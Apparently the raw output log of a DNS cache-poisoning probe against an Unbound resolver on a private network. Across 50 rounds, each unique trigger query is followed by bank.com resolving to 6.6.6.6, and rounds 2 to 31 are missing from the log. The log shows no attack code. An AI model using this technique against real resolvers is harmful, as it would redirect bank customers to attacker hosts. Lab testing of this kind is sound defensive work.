[+] E5-unbound probe: zone=example.net, rounds=50, resolver=10.80.0.53, profile=attack
[1/50] trigger=u18824.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=90.000ms bank=150.000ms
[32/50] trigger=u328825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=20.000ms
[33/50] trigger=u338825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=10.000ms
[34/50] trigger=u348825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=30.000ms
[35/50] trigger=u358825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=20.000ms
[36/50] trigger=u368825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=20.000ms
[37/50] trigger=u378825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=20.000ms
[38/50] trigger=u388825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=20.000ms
[39/50] trigger=u398825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=30.000ms bank=20.000ms
[40/50] trigger=u408825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=30.000ms bank=20.000ms
[41/50] trigger=u418825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=20.000ms
[42/50] trigger=u428825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=20.000ms
[43/50] trigger=u438825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=60.000ms bank=20.000ms
[44/50] trigger=u448825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=20.000ms
[45/50] trigger=u458825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=20.000ms
[46/50] trigger=u468825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=30.000ms bank=20.000ms
[47/50] trigger=u478825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=40.000ms bank=10.000ms
[48/50] trigger=u488825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=10.000ms
[49/50] trigger=u498825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=50.000ms bank=20.000ms
[50/50] trigger=u508825.example.net status=answer rc=0 bank.com -> 6.6.6.6 rc=0 | trigger=30.000ms bank=20.000ms
